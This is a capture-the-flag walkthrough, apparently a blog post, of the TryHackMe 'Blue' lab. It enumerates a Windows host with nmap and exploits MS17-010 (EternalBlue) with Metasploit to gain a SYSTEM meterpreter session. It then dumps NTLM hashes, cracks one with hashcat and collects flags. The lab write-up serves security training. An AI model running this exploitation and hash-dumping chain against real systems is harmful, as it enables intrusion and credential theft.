---
layout: post
title: TryHackMe - blue
---

## Enumeration
IP: 10.10.61.181
```
$ nmap -sV 10.10.61.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 16:27 EST
Nmap scan report for 10.10.61.181
Host is up (0.16s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.34 seconds
```
```
$ nmap -vv -sS --script vuln 10.10.61.181
....
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

....
```
Machine is vulnerable to ms17-010.

## Exploitation
```
$ msfconsole -q

msf5> search ms17-010
msf5> use 3
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.61.181
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
//background process with Ctrl-Z
msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf5 post(multi/manage/shell_to_meterpreter) > show options
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf5 post(multi/manage/shell_to_meterpreter) > exploit
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.20.232:4444 -> 10.10.61.181:49181 (10.10.61.181)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.8.20.232:4433 -> 10.10.61.181:49185 (10.10.61.181)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > shell
Process 3044 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```
## Gaining Access
```
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
meterpreter > ps
....
 3024  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
....
meterpreter > migrate 3024
[*] Migrating from 2640 to 3024...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

//save NT of NTLM into hashes.db
$ hashcat -m 1000 -a 0 hashes.db /usr/share/wordlists/rockyou.txt --f
....
31d6cfe0d16ae931b73c59d7e0c089c0:                
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22        
....
```
Jon's password is alqfna22.

## Finding Flags
```
meterpreter > cd C://
meterpreter > ls
Listing: C:\
============

Mode                 Size                Type  Last modified                     Name
----                 ----                ----  -------------                     ----
40777/rwxrwxrwx      0                   dir   2009-07-13 23:18:56 -0400         $Recycle.Bin
40777/rwxrwxrwx      0                   dir   2009-07-14 01:08:56 -0400         Documents and Settings
40777/rwxrwxrwx      0                   dir   2009-07-13 23:20:08 -0400         PerfLogs
40555/r-xr-xr-x      4096                dir   2009-07-13 23:20:08 -0400         Program Files
40555/r-xr-xr-x      4096                dir   2009-07-13 23:20:08 -0400         Program Files (x86)
40777/rwxrwxrwx      4096                dir   2009-07-13 23:20:08 -0400         ProgramData
40777/rwxrwxrwx      0                   dir   2018-12-12 22:13:22 -0500         Recovery
40777/rwxrwxrwx      4096                dir   2018-12-12 18:01:17 -0500         System Volume Information
40555/r-xr-xr-x      4096                dir   2009-07-13 23:20:08 -0400         Users
40777/rwxrwxrwx      16384               dir   2009-07-13 23:20:08 -0400         Windows
100666/rw-rw-rw-     24                  fil   2018-12-12 22:47:39 -0500         flag1.txt
507411620/rw--w----  446692146565644271  fif   14164114932-07-27 18:09:04 -0400  hiberfil.sys
507411620/rw--w----  446692146565644271  fif   14164114932-07-27 18:09:04 -0400  pagefile.sys

meterpreter > cat flag1.txt 
flag{access_the_machine}
```
Checked Jon's desktop, found flag in his documents folder.
```
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Music
40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Pictures
40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Videos
100666/rw-rw-rw-  402   fil   2018-12-12 22:13:45 -0500  desktop.ini
100666/rw-rw-rw-  37    fil   2018-12-12 22:49:18 -0500  flag3.txt

meterpreter > cat flag3.txt 
flag{admin_documents_can_be_valuable}
```
```
meterpreter > shell

C:\>dir flag* /s /p

//found flag2.lnk in C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

//contents said flag2.txt was in C:\Windows\System32\config\flag2.txt
//restarted deployment and logged back in with same exploit as before

C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
```